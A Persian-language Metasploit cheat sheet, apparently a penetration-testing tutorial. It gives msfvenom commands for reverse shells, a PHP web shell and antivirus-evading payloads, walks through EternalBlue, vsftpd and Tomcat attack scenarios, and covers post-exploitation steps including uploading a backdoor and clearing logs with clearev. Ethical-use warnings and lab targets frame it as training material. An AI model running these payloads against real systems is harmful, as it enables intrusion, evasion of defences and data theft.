⚡ چیت‌شیت جامع Metasploit

🔰 مقدمه – Metasploit چیست؟

Metasploit Framework یکی از قدرتمندترین و محبوب‌ترین چارچوب‌های تست نفوذ در جهان است که توسط Rapid7 توسعه داده شده است. این ابزار به متخصصان امنیت امکان می‌دهد تا آسیب‌پذیری‌ها را شناسایی، بهره‌برداری (Exploit) کرده و پس از نفوذ، عملیات‌های مختلفی را روی سیستم هدف انجام دهند.

Metasploit شامل مجموعه‌ای از ماژول‌ها (Modules) است که هر کدام برای یک کار خاص طراحی شده‌اند. این ماژول‌ها به هکر قانونمند اجازه می‌دهند تا حملات هدفمند و پیچیده‌ای را با حداقل کدنویسی انجام دهد.

💡 کاربردهای اصلی Metasploit:
  • بهره‌برداری (Exploitation): اجرای کدهای Exploit برای نفوذ به سیستم‌های آسیب‌پذیر.
  • تولید Payload: ایجاد بدافزار و کدهای مخرب برای دسترسی به سیستم هدف.
  • اسکن و شناسایی: کشف آسیب‌پذیری‌ها و جمع‌آوری اطلاعات از سیستم‌های هدف.
  • مدیریت پس از نفوذ (Post-Exploitation): پس از دسترسی به سیستم، انجام عملیات‌های مختلف مانند استخراج داده، افزایش دسترسی و …
  • آموزش و شبیه‌سازی: شبیه‌سازی حملات برای آموزش و ارزیابی امنیت.
⚠️ هشدار اخلاقی: Metasploit یک ابزار بسیار قدرتمند است. استفاده از آن برای حمله به سیستم‌های بدون مجوز، جرم محسوب می‌شود. فقط در محیط‌های آزمایشگاهی و با مجوز استفاده شود.

📥 نصب و راه‌اندازی Metasploit

📌 نصب در Kali Linux (پیش‌فرض):

Metasploit در Kali Linux به صورت پیش‌فرض نصب است. برای اطمینان از آخرین نسخه:

sudo apt update
sudo apt install metasploit-framework -y

📌 راه‌اندازی کنسول Metasploit:

msfconsole

📌 به‌روزرسانی پایگاه داده:

msfupdate
💡 نکته: پس از ورود به msfconsole، محیط تعاملی Metasploit نمایش داده می‌شود که با help می‌توانید لیست دستورات را مشاهده کنید.

🏗️ ساختار Metasploit و انواع ماژول‌ها

Metasploit شامل انواع مختلفی از ماژول‌ها است که هر کدام کاربرد خاصی دارند:

🎯 ۱. Exploit – ماژول‌های بهره‌برداری

این ماژول‌ها برای بهره‌برداری از آسیب‌پذیری‌های خاص طراحی شده‌اند.

  • مثال: exploit/windows/smb/ms17_010_eternalblue (EternalBlue برای ویندوز)
  • مثال: exploit/unix/ftp/vsftpd_234_backdoor (آسیب‌پذیری vsftpd)

📦 ۲. Payload – کدهای اجرایی پس از نفوذ

Payloadها کدهایی هستند که پس از موفقیت Exploit روی سیستم هدف اجرا می‌شوند.

  • مثال: windows/meterpreter/reverse_tcp (Meterpreter با اتصال معکوس)
  • مثال: linux/x64/shell_reverse_tcp (شل معکوس لینوکس)

🔍 ۳. Auxiliary – ماژول‌های کمکی

این ماژول‌ها برای اسکن، کشف، و جمع‌آوری اطلاعات استفاده می‌شوند.

  • مثال: auxiliary/scanner/portscan/tcp (اسکن پورت TCP)
  • مثال: auxiliary/scanner/smb/smb_version (شناسایی نسخه SMB)

🛠️ ۴. Post – ماژول‌های پس از نفوذ

ماژول‌هایی که پس از دسترسی به سیستم برای انجام عملیات‌های مختلف استفاده می‌شوند.

  • مثال: post/windows/gather/enum_users (شمارش کاربران ویندوز)
  • مثال: post/linux/gather/enum_configs (جمع‌آوری تنظیمات لینوکس)

🔧 ۵. Encoder – رمزنگاری Payload

برای دور زدن آنتی‌ویروس‌ها و سیستم‌های تشخیص نفوذ استفاده می‌شوند.

  • مثال: x86/shikata_ga_nai (معروف‌ترین encoder)

🧩 ۶. NOP – NOP Sled

برای پر کردن فضای خالی در بهره‌برداری‌های سرریز بافر استفاده می‌شوند.

⌨️ دستورات پایه در msfconsole

📦 کار با Payloadها و msfvenom

📌 ۱. msfvenom – تولید Payload

msfvenom ابزاری برای تولید Payloadهای سفارشی است که جایگزین msfpayload و msfencode شده است.

# نمایش لیست payloadها
msfvenom -l payloads

# نمایش لیست encoderها
msfvenom -l encoders

# تولید یک شل معکوس برای لینوکس
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o shell.elf

# تولید یک Meterpreter برای ویندوز
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# تولید یک Web Shell (PHP)
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# با Encoder برای فرار از آنتی‌ویروس
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

📌 ۲. تنظیم Payload در msfconsole

# بعد از انتخاب یک exploit
use exploit/windows/smb/ms17_010_eternalblue

# مشاهده payloadهای موجود
show payloads

# انتخاب payload
set payload windows/meterpreter/reverse_tcp

# تنظیم گزینه‌ها
set LHOST 192.168.1.100
set LPORT 4444
set RHOST 192.168.1.101

# اجرای حمله
exploit
⚠️ هشدار: Payloadهای تولیدشده با msfvenom توسط بسیاری از آنتی‌ویروس‌ها شناسایی می‌شوند. از Encoderها برای کاهش احتمال شناسایی استفاده کنید.

🧪 سناریوهای عملی با Metasploit

📌 سناریو ۱: حمله به vsftpd (Metasploitable 2)

msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.1.101
set RPORT 21
exploit

توضیح: این Exploit از آسیب‌پذیری پشتی (Backdoor) در نسخه vsftpd 2.3.4 استفاده می‌کند و یک شل مستقیم روی پورت ۶۲۰۰ باز می‌کند.

📌 سناریو ۲: حمله EternalBlue (MS17-010) به ویندوز

msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

توضیح: EternalBlue یکی از معروف‌ترین Exploitها است که از آسیب‌پذیری SMB در ویندوز استفاده می‌کند و به هکر اجازه می‌دهد به سیستم نفوذ کند.

📌 سناریو ۳: حمله به Tomcat (Apache Tomcat)

msfconsole
use exploit/multi/http/tomcat_mgr_deploy
set RHOST 192.168.1.101
set RPORT 8080
set USERNAME tomcat
set PASSWORD tomcat
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

📌 سناریو ۴: تولید و اجرای یک شل معکوس با msfvenom

# تولید Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe

# راه‌اندازی Listener در Metasploit
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit

# اجرای shell.exe روی سیستم هدف (با هر روشی مانند ایمیل یا USB)

📌 سناریو ۵: اسکن شبکه با ماژول‌های Auxiliary

# اسکن پورت TCP
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 22,80,443
run

# اسکن SMB Version
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.101
run

# اسکن SSH
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.1.101
run

📌 سناریو ۶: پس از نفوذ – جمع‌آوری اطلاعات

# پس از دسترسی به سیستم (Meterpreter)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps
meterpreter > download /etc/passwd
meterpreter > upload /root/backdoor.exe C:\Windows\Temp\
meterpreter > shell  # شل سیستمی

# نمایش گزینه‌ها
show options

# نمایش payloadهای موجود
show payloads

📌 مسیرهای مهم ماژول‌ها:

  • Exploit: /usr/share/metasploit-framework/modules/exploits/
  • Payload: /usr/share/metasploit-framework/modules/payloads/
  • Auxiliary: /usr/share/metasploit-framework/modules/auxiliary/
  • Post: /usr/share/metasploit-framework/modules/post/
💡 نکته: با دستور search می‌توانید به سرعت ماژول‌های مورد نظر را پیدا کنید. استفاده از کلمات کلیدی دقیق، نتایج بهتری به همراه دارد.

🔒 نکات امنیتی و حرفه‌ای

  • همیشه از محیط‌های مجازی استفاده کنید: هرگز Metasploit را روی سیستم‌های واقعی و بدون مجوز تست نکنید.
  • از Payloadهای مناسب استفاده کنید: انتخاب Payload مناسب (مثل Meterpreter vs Shell) به هدف حمله بستگی دارد.
  • تنظیم LHOST و LPORT به درستی: این گزینه‌ها باید آدرس و پورت سیستم مهاجم را مشخص کنند تا ارتباط برقرار شود.
  • استفاده از Encoder: برای کاهش احتمال شناسایی توسط آنتی‌ویروس‌ها، از Encoderهایی مانند x86/shikata_ga_nai استفاده کنید.
  • پاک کردن ردپا: پس از اتمام تست، با دستور clearev لاگ‌ها را پاک کنید (در محیط‌های مجاز).
  • مطالعه مستندات: هر ماژول اطلاعات کاملی در info دارد که قبل از استفاده حتماً مطالعه کنید.
  • آزمایش در محیط‌های کنترل‌شده: از محیط‌هایی مانند Metasploitable، DVWA و HackTheBox برای تمرین استفاده کنید.
⚠️ هشدار اخلاقی: Metasploit یک ابزار دو لبه است. استفاده نادرست از آن می‌تواند عواقب قانونی جدی داشته باشد. همیشه با مجوز و در چارچوب قوانین کار کنید.

📖 واژه‌نامه تخصصی Metasploit

واژهتوضیح کامل
Exploit کد یا تکنیکی که از یک آسیب‌پذیری برای نفوذ به سیستم استفاده می‌کند.
Payload کدی که پس از موفقیت Exploit روی سیستم هدف اجرا می‌شود (مثل شل، Meterpreter).
Meterpreter یک شل پیشرفته در Metasploit که امکانات زیادی مانند کی‌لاگر، دانلود/آپلود فایل و … را ارائه می‌دهد.
Auxiliary ماژول‌های کمکی برای اسکن، کشف و جمع‌آوری اطلاعات.
Post ماژول‌هایی که پس از نفوذ برای انجام عملیات‌های مختلف استفاده می‌شوند.
Encoder ابزاری برای رمزنگاری Payload و دور زدن آنتی‌ویروس‌ها.
NOP Sled رشته‌ای از دستورات NOP که برای پر کردن فضای خالی در حملات سرریز بافر استفاده می‌شود.
Handler ماژولی که برای دریافت اتصالات ورودی از Payloadها استفاده می‌شود.
msfvenom ابزار تولید Payload در Metasploit (جایگزین msfpayload و msfencode).
msfconsole واسط خط فرمان اصلی Metasploit.
RHOST آدرس IP یا نام دامنه سیستم هدف.
RPORT پورت سیستم هدف.
LHOST آدرس IP سیستم مهاجم (برای اتصال معکوس).
LPORT پورت سیستم مهاجم (برای اتصال معکوس).
EternalBlue یکی از معروف‌ترین Exploitها که از آسیب‌پذیری SMB در ویندوز استفاده می‌کند.
Session یک جلسه فعال بین مهاجم و سیستم هدف پس از موفقیت Exploit.
💡 جمع‌بندی چیت‌شیت Metasploit:

Metasploit یکی از قدرتمندترین ابزارهای تست نفوذ است که با ترکیب Exploit، Payload و ماژول‌های مختلف، به متخصصان امنیت امکان شبیه‌سازی حملات واقعی را می‌دهد. تسلط بر Metasploit برای هر هکر قانونمند ضروری است.

📌 توصیه نهایی: با ماژول‌های ساده شروع کنید (مثل vsftpd) و سپس به سراغ حملات پیچیده‌تر بروید. همیشه در محیط‌های آزمایشگاهی تمرین کنید و مستندات هر ماژول را قبل از استفاده مطالعه کنید.
